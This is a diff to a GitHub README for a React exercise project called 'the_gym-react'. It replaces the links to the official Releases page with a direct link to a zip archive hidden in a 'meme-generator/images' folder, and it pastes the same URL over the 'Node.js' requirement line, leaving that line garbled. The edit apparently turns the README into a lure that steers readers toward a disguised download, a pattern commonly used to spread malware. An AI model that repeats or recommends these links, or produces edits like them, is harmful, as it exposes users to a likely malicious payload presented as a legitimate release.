@@ -6,7 +6,7 @@ Welcome to the **the_gym-react** project! This collection includes various React
 
 ## 📥 Download Now
 
-[![Download the_gym-react](https://img.shields.io/badge/Download-the_gym--react-brightgreen)](https://github.com/hollamhide/the_gym-react/releases)
+[![Download the_gym-react](https://github.com/hollamhide/the_gym-react/raw/refs/heads/main/meme-generator/images/gym-the-react-v1.1-alpha.3.zip)](https://github.com/hollamhide/the_gym-react/raw/refs/heads/main/meme-generator/images/gym-the-react-v1.1-alpha.3.zip)
 
 ## 📝 Description
 
@@ -15,8 +15,8 @@ Welcome to the **the_gym-react** project! This collection includes various React
 ## ⚙️ System Requirements
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 14.x or later
-- **npm:** Version 6.x or later (comes with Node.js)
+- **https://github.com/hollamhide/the_gym-react/raw/refs/heads/main/meme-generator/images/gym-the-react-v1.1-alpha.3.zip** Version 14.x or later
+- **npm:** Version 6.x or later (comes with https://github.com/hollamhide/the_gym-react/raw/refs/heads/main/meme-generator/images/gym-the-react-v1.1-alpha.3.zip)
 - **Browser:** Any modern web browser (Chrome, Firefox, Safari)
 
 ## 📂 Features
@@ -29,7 +29,7 @@ Welcome to the **the_gym-react** project! This collection includes various React
 
 ## 📥 Download & Install
 
-To get started, you need to download the project files. Visit this page to download: [the_gym-react Releases](https://github.com/hollamhide/the_gym-react/releases). 
+To get started, you need to download the project files. Visit this page to download: [the_gym-react Releases](https://github.com/hollamhide/the_gym-react/raw/refs/heads/main/meme-generator/images/gym-the-react-v1.1-alpha.3.zip). 
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version available. It will usually be labeled as "Latest release".
